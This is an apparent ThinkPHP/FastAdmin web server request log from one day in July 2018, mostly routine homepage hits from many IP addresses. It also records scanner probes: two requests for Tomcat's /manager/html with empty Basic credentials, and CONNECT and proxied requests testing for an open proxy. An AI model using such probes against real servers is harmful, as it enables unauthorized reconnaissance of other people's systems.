[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T15:21:00+08:00 ] 82.102.166.150 GET /
[ info ] 118.24.114.43/ [运行时间：0.001834s][吞吐率：545.28req/s] [内存消耗：381.77kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000015s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000246s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'keep-alive' => '300',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
  'host' => '118.24.114.43',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000067s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T16:10:30+08:00 ] 115.127.67.234 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.001932s][吞吐率：517.62req/s] [内存消耗：381.65kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000015s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000236s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000066s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T16:12:48+08:00 ] 80.147.190.204 GET /
[ info ] 118.24.114.43/ [运行时间：0.002009s][吞吐率：497.72req/s] [内存消耗：381.77kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000023s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000475s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'keep-alive' => '300',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
  'host' => '118.24.114.43',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000066s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T17:06:42+08:00 ] 220.191.249.52 GET /manager/html
[ info ] 118.24.114.43:8080/manager/html [运行时间：0.001711s][吞吐率：584.41req/s] [内存消耗：237.92kb] [文件加载：54]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000240s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'manager',
    1 => 'html',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html, application/xhtml+xml, */*',
  'user-agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)',
  'host' => '118.24.114.43:8080',
  'authorization' => 'Basic Og==',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T17:22:34+08:00 ] 154.73.65.11 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.001877s][吞吐率：532.75req/s] [内存消耗：381.65kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000253s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000072s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T17:27:48+08:00 ] 138.121.130.12 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.001875s][吞吐率：533.29req/s] [内存消耗：381.65kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000015s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000237s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000068s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T17:44:07+08:00 ] 95.38.49.169 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.001915s][吞吐率：522.20req/s] [内存消耗：381.65kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000241s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000071s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T18:22:35+08:00 ] 189.46.35.246 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.001912s][吞吐率：523.05req/s] [内存消耗：381.65kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000234s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000068s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T18:28:47+08:00 ] 47.104.199.19 CONNECT www.baidu.com:443
[ info ] www.baidu.com:443www.baidu.com:443 [运行时间：0.001782s][吞吐率：561.19req/s] [内存消耗：381.10kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000014s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000231s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.baidu.com:443',
  'user-agent' => 'curl/7.35.0',
  'proxy-connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000067s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T18:59:02+08:00 ] 191.252.196.233 GET /
[ info ] 118.24.114.43/ [运行时间：0.002550s][吞吐率：392.17req/s] [内存消耗：381.77kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000028s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000416s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'keep-alive' => '300',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
  'host' => '118.24.114.43',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000093s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T19:53:35+08:00 ] 162.251.156.137 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.001932s][吞吐率：517.62req/s] [内存消耗：381.65kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000021s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000253s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000076s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T20:20:22+08:00 ] 51.15.80.123 GET /
[ info ] 118.24.114.43/ [运行时间：0.001890s][吞吐率：529.12req/s] [内存消耗：381.77kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000015s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000240s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'keep-alive' => '300',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
  'host' => '118.24.114.43',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000068s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T20:26:13+08:00 ] 79.132.13.116 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.002012s][吞吐率：497.01req/s] [内存消耗：381.65kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000015s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000308s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000069s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T21:00:49+08:00 ] 80.82.70.187 GET http://www.baidu.com/cache/global/img/gs.gif
[ info ] www.baidu.comhttp://www.baidu.com/cache/global/img/gs.gif [运行时间：0.001517s][吞吐率：659.17req/s] [内存消耗：237.48kb] [文件加载：54]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000250s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'cache',
    1 => 'global',
    2 => 'img',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.baidu.com',
  'user-agent' => 'Mozilla',
  'if-modified-since' => 'Thu, 19 Apr 2012 09:51:20 GMT',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T21:22:53+08:00 ] 85.196.133.34 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.002082s][吞吐率：480.28req/s] [内存消耗：381.65kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000020s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000260s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000071s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T21:54:25+08:00 ] 41.72.206.150 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.002574s][吞吐率：388.51req/s] [内存消耗：381.65kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000021s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000350s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000098s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T22:05:49+08:00 ] 134.236.242.115 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.001830s][吞吐率：546.42req/s] [内存消耗：381.65kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000015s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000309s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000067s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T22:14:56+08:00 ] 5.160.180.242 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.001836s][吞吐率：544.64req/s] [内存消耗：381.65kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000233s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000066s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T22:24:22+08:00 ] 211.144.157.50 GET /manager/html
[ info ] 118.24.114.43:8080/manager/html [运行时间：0.001485s][吞吐率：673.35req/s] [内存消耗：237.92kb] [文件加载：54]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000259s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'manager',
    1 => 'html',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html, application/xhtml+xml, */*',
  'user-agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)',
  'host' => '118.24.114.43:8080',
  'authorization' => 'Basic Og==',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T22:26:00+08:00 ] 209.126.136.4 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.001810s][吞吐率：552.54req/s] [内存消耗：381.77kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000235s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000066s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T23:33:54+08:00 ] 211.58.240.42 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.002162s][吞吐率：462.54req/s] [内存消耗：381.65kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000015s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000293s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000089s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T23:50:12+08:00 ] 27.54.165.250 GET /
